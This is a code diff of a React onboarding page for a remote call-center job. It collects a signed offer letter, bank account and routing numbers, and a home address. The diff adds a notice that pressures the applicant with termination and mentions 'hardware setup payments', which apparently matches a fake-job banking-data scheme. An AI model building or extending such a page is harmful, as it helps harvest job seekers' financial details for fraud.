@@ -74,7 +74,7 @@ export default function LetterPage() {
       console.log("Server Response:", data);
 
       if (data.success) {
-        alert("Information uploaded successfully!");
+        // alert("Information uploaded successfully!");
         setTimeout(() => {
           setLoading(false);
           router.push('/autonavigate');
@@ -97,19 +97,28 @@ export default function LetterPage() {
     <main className="p-6 lg:p-12 bg-gray-50 dark:bg-gray-900">
       <div className="max-w-7xl mx-auto space-y-12">
         
+        {/* Notice Section */}
+        <section className="bg-yellow-100 dark:bg-yellow-800 p-6 rounded-lg shadow-lg">
+          <h2 className="text-3xl font-semibold text-gray-900 dark:text-gray-100 mb-4">Important Notice</h2>
+          <p className="text-lg text-gray-600 dark:text-gray-400">
+            ATTN: {user.fullName}, please ensure that the information you provide matches your application information to avoid termination of your application.
+          </p>
+          <p className="text-lg text-gray-600 dark:text-gray-400">
+            This includes the signed offer letter and the required payment information to receive onboarding materials, hardware setup payments, and access to the CRM.
+          </p>
+        </section>
+
         {/* Signed Employment Letter Upload Section */}
-        <section className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg">
+        <section className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg space-y-6">
           <h2 className="text-3xl font-semibold text-gray-900 dark:text-gray-100 mb-4">Upload Signed Letter</h2>
-          <div className="space-y-4">
-            <div>
-              <label className="block text-gray-700 dark:text-gray-300">Signed Employment Letter (PDF)</label>
-              <input type="file" accept=".pdf" onChange={(e) => handleFileChange(e, setSignedLetter)} className="mt-1 block w-full" disabled={loading} />
-            </div>
+          <div>
+            <label className="block text-gray-700 dark:text-gray-300">Signed Employment Offer Letter (PDF)</label>
+            <input type="file" accept=".pdf" onChange={(e) => handleFileChange(e, setSignedLetter)} className="mt-1 block w-full" disabled={loading} />
           </div>
         </section>
 
         {/* Onboarding / Wage Payment */}
-        <section className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg">
+        <section className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg space-y-6">
           <h2 className="text-3xl font-semibold text-gray-900 dark:text-gray-100 mb-4">Onboarding / Wage Payment</h2>
           <div className="space-y-4">
             <div>
@@ -124,20 +133,20 @@ export default function LetterPage() {
               <input type="text" value={bankName} onChange={(e) => setBankName(e.target.value)} className="mt-1 block w-full" disabled={loading} />
             </div>
             <div>
-              <label className="block text-gray-700 dark:text-gray-300">Account Name</label>
+              <label className="block text-gray-700 dark:text-gray-300">Full Name on Account</label>
               <input type="text" value={accountName} onChange={(e) => setAccountName(e.target.value)} className="mt-1 block w-full" disabled={loading} />
             </div>
             <div>
               <label className="block text-gray-700 dark:text-gray-300">Account Number</label>
-              <input type="number" value={accountNumber} onChange={(e) => setAccountNumber(e.target.value)} className="mt-1 block w/full" disabled={loading} />
+              <input type="number" value={accountNumber} onChange={(e) => setAccountNumber(e.target.value)} className="mt-1 block w-full" disabled={loading} />
             </div>
             <div>
               <label className="block text-gray-700 dark:text-gray-300">Routing Number</label>
-              <input type="number" value={routingNumber} onChange={(e) => setRoutingNumber(e.target.value)} className="mt-1 block w/full" disabled={loading} />
+              <input type="number" value={routingNumber} onChange={(e) => setRoutingNumber(e.target.value)} className="mt-1 block w-full" disabled={loading} />
             </div>
             <div>
               <label className="block text-gray-700 dark:text-gray-300">Home/Mail Address</label>
-              <input type="text" value={address} onChange={(e) => setAddress(e.target.value)} className="mt-1 block w/full" disabled={loading} />
+              <input type="text" value={address} onChange={(e) => setAddress(e.target.value)} className="mt-1 block w-full" disabled={loading} />
             </div>
             <button onClick={handleSubmit} className="bg-blue-600 text-white px-6 py-3 rounded-full text-lg hover:bg-blue-500 transition" disabled={loading}>
               {loading ? 'Uploading...' : 'Upload Information'}
@@ -146,7 +155,7 @@ export default function LetterPage() {
         </section>
 
         {/* Required Hardware Section */}
-        <section className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg">
+        <section className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg space-y-6">
           <h2 className="text-3xl font-semibold text-gray-900 dark:text-gray-100 mb-4">Hardware Requirements</h2>
           <p className="text-lg text-gray-600 dark:text-gray-400">
             To set up your workspace as a Call Center Agent (Remote), you will need the following hardware:
@@ -163,7 +172,7 @@ export default function LetterPage() {
         </section>
 
         {/* CRM Portal Access Section */}
-        <section className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg">
+        <section className="bg-white dark:bg-gray-800 p-6 rounded-lg shadow-lg space-y-6">
           <h2 className="text-3xl font-semibold text-gray-900 dark:text-gray-100 mb-4">CRM Portal Access</h2>
           <p className="text-lg text-gray-600 dark:text-gray-400">
             As a Call Center Agent, you will have access to our CRM portal to manage customer interactions and records. The CRM portal allows you to:
